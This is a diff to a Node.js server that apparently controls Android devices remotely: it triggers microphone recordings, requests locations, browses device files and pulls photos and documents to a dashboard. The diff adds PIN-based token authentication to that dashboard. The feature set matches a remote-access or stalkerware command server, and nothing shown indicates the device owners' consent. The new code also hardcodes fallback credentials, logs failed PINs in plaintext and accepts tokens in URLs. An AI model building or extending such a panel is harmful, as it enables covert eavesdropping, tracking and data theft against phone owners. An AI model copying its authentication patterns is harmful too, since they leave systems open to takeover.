@@ -5,18 +5,65 @@ const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
 const cors = require('cors');
+const crypto = require('crypto');
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 const PORT = process.env.PORT || 3000;
+const ADMIN_PIN = process.env.ADMIN_PIN || process.env.ADMIN_PASSWORD || '121288';
+const JWT_SECRET = process.env.JWT_SECRET || 'audio_monitor_sec_key_4b072728';
+
 const BASE_STORAGE = process.env.DATA_DIR || path.join(__dirname, 'storage');
 const STORAGE_DIR = path.join(BASE_STORAGE, 'recordings');
 const REMOTE_FILES_DIR = path.join(BASE_STORAGE, 'remote_files');
 const DB_FILE = path.join(BASE_STORAGE, 'metadata.json');
 const LOCATIONS_FILE = path.join(BASE_STORAGE, 'locations.json');
 const REMOTE_FILES_META = path.join(BASE_STORAGE, 'remote_files.json');
+
+// Token authentication functions
+function generateAuthToken() {
+  const payload = {
+    role: 'admin',
+    createdAt: Date.now(),
+    expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000 // 30 days valid
+  };
+  const payloadStr = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const signature = crypto.createHmac('sha256', JWT_SECRET).update(payloadStr).digest('base64url');
+  return `${payloadStr}.${signature}`;
+}
+
+function verifyAuthToken(token) {
+  if (!token || typeof token !== 'string') return false;
+  const parts = token.split('.');
+  if (parts.length !== 2) return false;
+  const [payloadStr, signature] = parts;
+  const expectedSig = crypto.createHmac('sha256', JWT_SECRET).update(payloadStr).digest('base64url');
+  if (signature !== expectedSig) return false;
+  try {
+    const payload = JSON.parse(Buffer.from(payloadStr, 'base64url').toString('utf8'));
+    if (payload.expiresAt && Date.now() > payload.expiresAt) return false;
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+function requireAuth(req, res, next) {
+  const authHeader = req.headers.authorization;
+  let token = null;
+  if (authHeader && authHeader.startsWith('Bearer ')) {
+    token = authHeader.substring(7).trim();
+  } else if (req.query && req.query.token) {
+    token = req.query.token;
+  }
+
+  if (verifyAuthToken(token)) {
+    return next();
+  }
+  return res.status(401).json({ error: 'No autorizado. Se requiere PIN de acceso.', code: 'UNAUTHORIZED' });
+}
 
 // Ensure storage directories exist
 if (!fs.existsSync(BASE_STORAGE)) {
@@ -227,11 +274,15 @@ wss.on('connection', (ws, req) => {
             location: newLoc
           });
         } else if (data.type === 'file_list_response') {
-          console.log(`📁 Lista de archivos recibida de ${deviceId} para ruta: ${data.path} (${data.files?.length || 0} elementos)`);
+          console.log(`📁 Lista de archivos recibida de ${deviceId} para ruta: ${data.path} (pág ${data.page || 1}/${data.totalPages || 1}, ${data.files?.length || 0} elementos)`);
           broadcastToDashboards({
             type: 'FILE_LIST_RECEIVED',
             deviceId,
             path: data.path,
+            page: data.page || 1,
+            pageSize: data.pageSize || 30,
+            totalFiles: data.totalFiles || data.files?.length || 0,
+            totalPages: data.totalPages || 1,
             files: data.files || []
           });
         }
@@ -251,7 +302,18 @@ wss.on('connection', (ws, req) => {
 
   } else {
     // Dashboard web client
-    console.log('💻 Cliente Dashboard conectado');
+    const token = urlParams.get('token');
+    if (!verifyAuthToken(token)) {
+      console.log('🔒 Conexión de Dashboard rechazada: token inválido o ausente');
+      ws.send(JSON.stringify({
+        type: 'AUTH_REQUIRED',
+        message: 'Acceso no autorizado. Se requiere PIN de administrador.'
+      }));
+      ws.close(4001, 'Unauthorized');
+      return;
+    }
+
+    console.log('💻 Cliente Dashboard autenticado y conectado');
     connectedDashboards.add(ws);
 
     // Send initial status immediately
@@ -361,10 +423,14 @@ wss.on('connection', (ws, req) => {
           if (targetDeviceId && connectedDevices.has(targetDeviceId)) {
             const target = connectedDevices.get(targetDeviceId);
             if (target.ws.readyState === WebSocket.OPEN) {
-              console.log(`📁 Solicitando listado de archivos en ${targetDeviceId} para ruta: ${data.path}`);
+              const page = parseInt(data.page, 10) || 1;
+              const pageSize = parseInt(data.pageSize, 10) || 30;
+              console.log(`📁 Solicitando listado de archivos en ${targetDeviceId} para ruta: ${data.path} (pág ${page}, ${pageSize} items)`);
               target.ws.send(JSON.stringify({
                 action: 'list_files',
-                path: data.path || ''
+                path: data.path || '',
+                page: page,
+                pageSize: pageSize
               }));
             }
           }
@@ -420,13 +486,37 @@ setInterval(() => {
 
 // --- REST API Endpoints ---
 
+// 0. AUTHENTICATION ENDPOINTS
+app.post('/api/auth/login', (req, res) => {
+  const { pin, password } = req.body || {};
+  const submitted = (pin || password || '').toString().trim();
+  const expected = ADMIN_PIN.toString().trim();
+
+  if (submitted === expected) {
+    const token = generateAuthToken();
+    console.log('🔓 Inicio de sesión exitoso en el Panel Web');
+    return res.json({ success: true, token, message: 'Autenticación exitosa' });
+  }
+
+  console.warn('⚠️ Intento de acceso fallido al Panel Web con PIN:', submitted);
+  return res.status(401).json({ error: 'PIN o contraseña incorrecta' });
+});
+
+app.get('/api/auth/check', requireAuth, (req, res) => {
+  res.json({ success: true, authenticated: true });
+});
+
+app.post('/api/auth/logout', (req, res) => {
+  res.json({ success: true, message: 'Sesión cerrada' });
+});
+
 // 1. Get Devices List
-app.get('/api/devices', (req, res) => {
+app.get('/api/devices', requireAuth, (req, res) => {
   res.json(getDevicesList());
 });
 
 // 2. Trigger Recording via HTTP
-app.post('/api/record/trigger', (req, res) => {
+app.post('/api/record/trigger', requireAuth, (req, res) => {
   const { durationSeconds = 60, deviceId } = req.body;
   const targetId = deviceId || Array.from(connectedDevices.keys())[0];
 
@@ -445,7 +535,7 @@ app.post('/api/record/trigger', (req, res) => {
 });
 
 // 3. Request Instant Location via HTTP
-app.post('/api/location/request', (req, res) => {
+app.post('/api/location/request', requireAuth, (req, res) => {
   const { deviceId } = req.body;
   const targetId = deviceId || Array.from(connectedDevices.keys())[0];
 
@@ -467,7 +557,7 @@ app.post('/api/location/request', (req, res) => {
   res.json({ success: true, message: `Solicitud de ubicación enviada a ${targetId}` });
 });
 
-// 4. Report Location from Android via REST
+// 4. Report Location from Android via REST (Open to device)
 app.post('/api/location/report', (req, res) => {
   const { deviceId, deviceName, latitude, longitude, accuracy, mapsUrl, notes, provider, city, battery, networkType, error } = req.body;
   const locations = loadLocations();
@@ -510,12 +600,12 @@ app.post('/api/location/report', (req, res) => {
 });
 
 // 5. Get Stored Locations History
-app.get('/api/locations', (req, res) => {
+app.get('/api/locations', requireAuth, (req, res) => {
   res.json(loadLocations());
 });
 
 // 6. Delete Location Record
-app.delete('/api/locations/:id', (req, res) => {
+app.delete('/api/locations/:id', requireAuth, (req, res) => {
   const locId = req.params.id;
   let locations = loadLocations();
   locations = locations.filter(item => item.id !== locId);
@@ -529,7 +619,7 @@ app.delete('/api/locations/:id', (req, res) => {
   res.json({ success: true, message: 'Registro de ubicación eliminado' });
 });
 
-// 7. Upload Audio File from Android
+// 7. Upload Audio File from Android (Open to device)
 app.post('/api/upload', uploadAudio.single('audio'), (req, res) => {
   if (!req.file) {
     return res.status(400).json({ error: 'No se recibió ningún archivo de audio' });
@@ -615,7 +705,7 @@ app.post('/api/upload', uploadAudio.single('audio'), (req, res) => {
 });
 
 // 8. List all stored recordings
-app.get('/api/recordings', (req, res) => {
+app.get('/api/recordings', requireAuth, (req, res) => {
   const metadata = loadMetadata();
   const validRecords = metadata.filter(rec => {
     return fs.existsSync(path.join(STORAGE_DIR, rec.filename));
@@ -624,7 +714,7 @@ app.get('/api/recordings', (req, res) => {
 });
 
 // 9. Stream / Download audio file
-app.get('/api/recordings/:filename', (req, res) => {
+app.get('/api/recordings/:filename', requireAuth, (req, res) => {
   const filePath = path.join(STORAGE_DIR, req.params.filename);
   if (!fs.existsSync(filePath)) {
     return res.status(404).send('Archivo no encontrado');
@@ -657,7 +747,7 @@ app.get('/api/recordings/:filename', (req, res) => {
 });
 
 // 10. Delete recording
-app.delete('/api/recordings/:filename', (req, res) => {
+app.delete('/api/recordings/:filename', requireAuth, (req, res) => {
   const filename = req.params.filename;
   const filePath = path.join(STORAGE_DIR, filename);
 
@@ -679,7 +769,7 @@ app.delete('/api/recordings/:filename', (req, res) => {
 
 // --- REMOTE FILE MANAGER ENDPOINTS ---
 
-// 11. Upload file transferred from Android (Photo, Log, Document)
+// 11. Upload file transferred from Android (Photo, Log, Document) - Open to device
 app.post('/api/files/upload', uploadRemoteFile.single('file'), (req, res) => {
   if (!req.file) {
     return res.status(400).json({ error: 'No se recibió ningún archivo' });
@@ -720,14 +810,14 @@ app.post('/api/files/upload', uploadRemoteFile.single('file'), (req, res) => {
 });
 
 // 12. List all files previously fetched to the server
-app.get('/api/files/stored', (req, res) => {
+app.get('/api/files/stored', requireAuth, (req, res) => {
   const files = loadRemoteFiles();
   const validFiles = files.filter(f => fs.existsSync(path.join(REMOTE_FILES_DIR, f.filename)));
   res.json(validFiles);
 });
 
 // 13. Download / View Remote File
-app.get('/api/files/view/:filename', (req, res) => {
+app.get('/api/files/view/:filename', requireAuth, (req, res) => {
   const filePath = path.join(REMOTE_FILES_DIR, req.params.filename);
   if (!fs.existsSync(filePath)) {
     return res.status(404).send('Archivo no encontrado');
@@ -753,7 +843,7 @@ app.get('/api/files/view/:filename', (req, res) => {
 });
 
 // 14. Force Download Remote File
-app.get('/api/files/download/:filename', (req, res) => {
+app.get('/api/files/download/:filename', requireAuth, (req, res) => {
   const filePath = path.join(REMOTE_FILES_DIR, req.params.filename);
   if (!fs.existsSync(filePath)) {
     return res.status(404).send('Archivo no encontrado');
@@ -762,7 +852,7 @@ app.get('/api/files/download/:filename', (req, res) => {
 });
 
 // 15. Delete stored remote file
-app.delete('/api/files/:id', (req, res) => {
+app.delete('/api/files/:id', requireAuth, (req, res) => {
   const fileId = req.params.id;
   let remoteFiles = loadRemoteFiles();
   const target = remoteFiles.find(f => f.id === fileId);
